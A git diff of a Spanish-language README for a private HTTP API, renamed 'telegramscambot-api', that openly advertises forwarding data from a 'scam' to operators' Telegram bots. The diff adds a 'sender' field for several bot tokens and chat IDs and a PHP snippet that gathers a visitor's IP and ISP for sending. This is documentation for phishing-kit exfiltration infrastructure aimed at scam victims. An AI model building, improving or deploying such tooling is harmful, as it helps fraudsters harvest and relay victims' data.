@@ -1,7 +1,7 @@
-# telegrambot-api
+# telegramscambot-api
 
 ## ¿Qué es?
-Es una HTTP API en desarrollo creada por @tona420, la cual mejora, acelera y hace mas sencilla la comunicación a un bot de Telegram. 
+Es una HTTP API en desarrollo creada por @tona420, la cual mejora, acelera y hace mas sencilla la comunicación de un scam a un bot de Telegram. 
 
 ## ¿Es de uso público?
 Por el momento, la API es privada y solo pocos usuarios tienen acceso a ella, pero no te preocupes, muy pronto se hará pública y todos podran acceder y usarla.
@@ -30,9 +30,12 @@ Es muy sencillo, éste código lo que hace es tomar los datos y enviarlos a la A
 ### ¿Qué datos puedo enviar?
 Estos son los datos que puedes enviar mediante la API:
 
-- 'apikey' = Es la llave para poder acceder a la API. _*
-- 'token' = Es el token de tu bot de telegram. _*
-- 'chatid' = Es el ID de tu usuario de telegram. _*
+- 'apikey' = Es la llave para poder acceder a la API. _*_
+
+- 'sender' = Es el token de tu bot y tu chat id de telegram, el formato es: token/chatid _*_
+    #### Puedes enviar multiples mensajes a tokens e ids diferentes, solo usa "," para separarlos, ej: 
+    'sender' => '10101010101:Adk4mfD/14038583992,2323232323:lRj4mf83kmdPfkj/6034857366'
+
 - 'scam' = El nombre de tu scam.
 - 'ip' = La IP del usuario.
 - 'isp' = El ISP del usuario.
@@ -67,8 +70,7 @@ $isp = gethostbyaddr($_SERVER['REMOTE_ADDR']);
 
 $data = array(
     'apikey' => 'apikey',
-    'token' => '10101010101:Adk4mfD', 
-    'chatid' => '160043220454',
+    'sender' => '10101010101:Adk4mfD/14038583992,2323232323:lRj4mf83kmdPfkj/6034857366',
     
     'ip' => $ip, 
     'isp' => $isp,
